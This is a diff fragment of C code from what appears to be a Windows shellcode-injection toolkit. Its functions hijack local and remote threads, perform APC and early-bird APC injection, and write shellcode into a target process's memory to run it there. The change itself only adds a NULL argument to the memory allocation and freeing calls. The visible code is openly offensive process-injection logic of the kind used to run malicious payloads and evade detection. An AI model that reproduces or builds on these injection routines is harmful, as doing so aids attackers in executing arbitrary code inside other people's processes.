@@ -17,7 +17,7 @@ BOOL LocalThreadHijacking(IN LPCSTR lpShellcodePath, IN DWORD dwMainThreadId)
 	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
 		return FALSE;
 
-	if (!AllocateMemory(NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
+	if (!AllocateMemory(NULL, NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
 	if (!ObtainThreadHandle(NULL, NULL, dwMainThreadId, &hThread, &dwThreadId))
@@ -30,7 +30,7 @@ BOOL LocalThreadHijacking(IN LPCSTR lpShellcodePath, IN DWORD dwMainThreadId)
 		return FALSE;
 
 	LocalFree(pShellcode);
-	FreeMemory(NULL, pShellcodeAddr);
+	FreeMemory(NULL, NULL, pShellcodeAddr);
 	CloseHandle(hThread);
 }
 
@@ -47,7 +47,7 @@ BOOL RemoteThreadHijacking(IN LPCSTR lpProcessName, IN DWORD dwThreadEnumeration
 	if (!ObtainProcessHandle(SNAPSHOT, lpProcessName, &hProcess, &dwProcessId))
 		return FALSE;
 
-	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
 	if (!ObtainThreadHandle(dwThreadEnumerationMethod, dwProcessId, NULL, &hThread, &dwThreadId))
@@ -60,7 +60,7 @@ BOOL RemoteThreadHijacking(IN LPCSTR lpProcessName, IN DWORD dwThreadEnumeration
 		return FALSE;
 
 	LocalFree(pShellcode);
-	FreeMemory(hProcess, pShellcodeAddr);
+	FreeMemory(NULL, hProcess, pShellcodeAddr);
 	CloseHandle(hThread);
 
 	return TRUE;
@@ -81,7 +81,7 @@ BOOL ApcInjection(IN BOOL bAlertable, IN DWORD dwAlertableFunction, IN LPCSTR lp
 		if (!ObtainProcessHandle(SNAPSHOT, lpProcessName, &hProcess, &dwProcessId))
 			return FALSE;
 
-	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
 	if (bAlertable)
@@ -102,7 +102,7 @@ BOOL ApcInjection(IN BOOL bAlertable, IN DWORD dwAlertableFunction, IN LPCSTR lp
 
 
 	LocalFree(pShellcode);
-	FreeMemory(hProcess, pShellcodeAddr);
+	FreeMemory(NULL, hProcess, pShellcodeAddr);
 	CloseHandle(hThread);
 
 	return TRUE;
@@ -123,7 +123,7 @@ BOOL ApcHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
 	if (!ObtainProcessHandle(SNAPSHOT, lpProcessName, &hProcess, &dwProcessId))
 		return FALSE;
 
-	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pShellcodeAddr;
 
@@ -147,7 +147,7 @@ BOOL ApcHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
 
 	LocalFree(pShellcode);
 	CloseHandle(hSnapshot);
-	FreeMemory(hProcess, pShellcodeAddr);
+	FreeMemory(NULL, hProcess, pShellcodeAddr);
 	CloseHandle(hThread);
 
 	return TRUE;
@@ -166,7 +166,7 @@ BOOL EarlyBirdApcInjection(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, IN 
 	if (!RunProcess(dwCreationFlag, lpProcessName, &hProcess, &hThread, &dwProcessId))
 		return FALSE;
 
-	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
+	if (!AllocateMemory(NULL, hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
 		return FALSE;
 
 	if (!QueueUserAPC((PAPCFUNC)pShellcodeAddr, hThread, NULL))
@@ -190,7 +190,7 @@ BOOL EarlyBirdApcInjection(IN DWORD dwCreationFlag, IN LPCSTR lpProcessName, IN 
 
 	LocalFree(pShellcode);
 	CloseHandle(hThread);
-	FreeMemory(hProcess, pShellcodeAddr);
+	FreeMemory(NULL, hProcess, pShellcodeAddr);
 
 	return TRUE;
 }
